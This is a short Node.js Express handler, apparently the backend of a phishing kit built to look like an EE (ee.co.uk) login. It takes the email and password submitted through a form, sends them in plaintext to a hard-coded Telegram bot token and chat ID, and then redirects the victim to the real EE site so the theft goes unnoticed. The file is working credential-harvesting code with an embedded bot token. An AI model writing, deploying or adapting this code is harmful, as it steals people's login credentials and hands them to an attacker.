// Import required modules
const express = require('express');
const axios = require('axios');

// Initialize Express app
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot API details
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Replace with your bot token
const chatId = '7587120060'; // Replace with your chat ID

// Handle POST request from the form
app.post('/api/submit', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Validate input
        if (!email || !password) {
            return res.status(400).send('Email and password are required.');
        }

        // Prepare message for Telegram
        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;

        // Send message to Telegram bot
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
        });

        // Redirect user to https://ee.co.uk/
        res.redirect('https://ee.co.uk/');
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).send('An error occurred while processing your request.');
    }
});

// Export the handler for Vercel
module.exports = app;
